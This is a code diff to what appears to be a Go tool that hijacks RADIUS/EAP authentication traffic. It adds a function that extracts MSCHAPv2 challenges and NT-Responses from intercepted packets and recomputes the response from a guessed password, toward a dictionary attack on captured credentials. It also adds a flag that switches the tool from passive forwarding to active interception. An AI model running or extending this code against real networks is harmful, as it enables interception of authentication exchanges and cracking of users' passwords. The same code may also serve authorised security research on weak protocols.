@@ -673,16 +673,8 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 
 					msChapv2Packet := eapPacket.(*eap.EapMSCHAPv2)
 
-					fmt.Println("MSChapv2 OpcCode:", msChapv2Packet.GetOpCode())
-					fmt.Println("MSChapv2 MsID:", msChapv2Packet.GetMsgID())
+					manageMsChapV2(msChapv2Packet, context)
 
-					fmt.Println("MSChapv2 Value:")
-					fmt.Println(hex.Dump(msChapv2Packet.GetValue()))
-
-					fmt.Println("MSChapv2 Name:", msChapv2Packet.GetName())
-					fmt.Println("MSChapv2 Message:", msChapv2Packet.GetMessage())
-
-					//fmt.Println("MSChapV2 Decoded. OpCode:", msChapv2Packet.GetOpCode())
 				}
 			}
 		}
@@ -692,9 +684,51 @@ func onTLSData(tlsContent []byte, context *session.ContextInfo,
 
 }
 
+func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
+
+	fmt.Println("MSChapv2 MsID:", packet.GetMsgID())
+
+	if packet.GetName() != "" {
+		fmt.Println("MSChapv2 Name:", packet.GetName())
+	}
+
+	switch packet.GetOpCode() {
+	case eap.MsChapV2Challenge:
+		fmt.Println("Received auth challenge:")
+		fmt.Println(hex.Dump(packet.GetAuthChallenge()))
+
+		context.SetMsChapV2AuthChallenge(packet.GetAuthChallenge())
+
+	case eap.MsChapV2Response:
+		fmt.Println("Received response")
+		peerChallenge, ntResponse, _ := eap.MSCHAPv2ExtractFromResponse(packet.GetResponse())
+
+		fmt.Println("Peer challenge")
+		fmt.Println(hex.Dump(peerChallenge))
+
+		context.SetMsChapV2PeerChallenge(peerChallenge)
+
+		fmt.Println("NT-Response")
+		fmt.Println(hex.Dump(ntResponse))
+
+		context.SetMsChapV2NTResponse(ntResponse)
+
+		fmt.Println("Generating local NT-Response from intercepted data")
+
+		calculatedResponse := eap.MsChapV2GenerateNTResponse(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(), context.GetUserName(), "password")
+
+		fmt.Println("Local NT-Response:")
+
+		fmt.Println(hex.Dump(calculatedResponse))
+	}
+
+}
+
 func main() {
 
 	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")
+
+	active := flag.Bool("active", false, "When activated, communications will be intercepted, otherwise, we only forward packets")
 
 	flag.Parse()
 
@@ -702,7 +736,13 @@ func main() {
 
 	//Init session
 
-	mySession.Init(session.Active, hostName, authPort, accPort)
+	mode := session.Passive
+
+	if *active {
+		mode = session.Active
+	}
+
+	mySession.Init(mode, hostName, authPort, accPort)
 
 	mySession.Hijack(manglePacket)
 }
